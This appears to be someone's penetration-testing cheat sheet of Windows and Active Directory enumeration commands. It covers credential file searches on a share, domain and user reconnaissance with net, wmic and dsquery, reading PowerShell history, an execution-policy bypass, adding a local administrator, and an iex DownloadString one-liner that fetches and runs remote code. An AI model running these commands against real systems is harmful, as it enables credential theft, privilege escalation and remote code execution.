```
dir n: /a-d /s /b | find /c ":\"
```

```
dir N:\*cred* /s /b

dir N:\*secret* /s /b

findstr /s /i cred n:\*.*


```


POWER SHELL!!!
```
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```


  g is your search strings    /f search these files  output
```
findstr /g:stringlist.txt /f:filelist.txt > results.out
```

systeminfo

wmic qfe get Caption,Description

net start

wmic product get name,version,vendor

whoami

whoami /priv

whoami /groups

net user

net group

net localgroup

net accounts

net accounts /domain

ipconfig /all

netstat -abno

arp -a

net share

route print

netsh advfirewall show state


WMIC Commands

```
wmic qfe get Caption,Description,HotFixID,InstalledOn

wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	

wmic process list /format:list	

wmic ntdomain list /format:list	

wmic useraccount list /format:list	

wmic group list /format:list	

wmic sysaccount list /format:list	
```

Net Commands

```
net accounts	

net accounts /domain	

net group /domain	

net group "Domain Admins" /domain	

net group "domain computers" /domain	

net group "Domain Controllers" /domain	

net group <domain_group_name> /domain	

net groups /domain	

net localgroup	

net localgroup administrators /domain	

net localgroup Administrators	

net localgroup administrators [username] /add	

net share	

net user <ACCOUNT_NAME> /domain	

net user /domain	

net user %username%	

net use x: \computer\share	

net view	

net view /all /domain[:domainname]	

net view \computer /ALL	

net view /domain	

```


DS query
```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
```
dsquery * -filter “(objectClass=trustedDomain)” -attr *
```
```
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

object must be a user and combines it with searching for a UAC bit value of 64(Password Can't Change)
```
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
```

(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))

Powershell commands

```
Get-Module
```
```
Get-ExecutionPolicy -List	
```
```
Set-ExecutionPolicy Bypass -Scope Process	
```
```
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt	
```
```
Get-ChildItem Env: | ft Key,Value	
```
```
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"	
```
```
Get-MpComputerStatus
```


powershell Firewall check
```
netsh advfirewall show allprofiles
```

EXE windows check
```
sc query windefend
```
